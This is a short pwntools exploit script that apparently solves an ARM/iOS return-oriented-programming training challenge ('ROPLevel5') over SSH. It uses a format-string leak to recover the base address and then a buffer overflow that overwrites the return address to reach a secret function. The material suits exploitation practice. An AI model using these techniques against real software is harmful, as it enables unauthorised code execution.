from pwn import *
context.log_level = 'info'

HOST_iPhone = "192.168.10.2"
USER_iPhone = "pwn"

s = ssh(user = USER_iPhone, host = HOST_iPhone)

p = s.run("/var/pwn/work/Exploit-Challenges-master/rop/ROPLevel5/roplevel5")

offset_secret_func = 0xbd5c


payload = b"%22$08x"
p.sendlineafter(b"Leave some feedback:\n", payload)
addr_base  = int("0x" + p.recvline()[:-1].decode(), 16) - 0xbe0c
log.info("addr_base = " + hex(addr_base))

payload = b"A" * 0x14
payload += p32(addr_base + offset_secret_func + 4)
p.sendlineafter(b"Leave some feedback:\n", payload)


p.interactive()
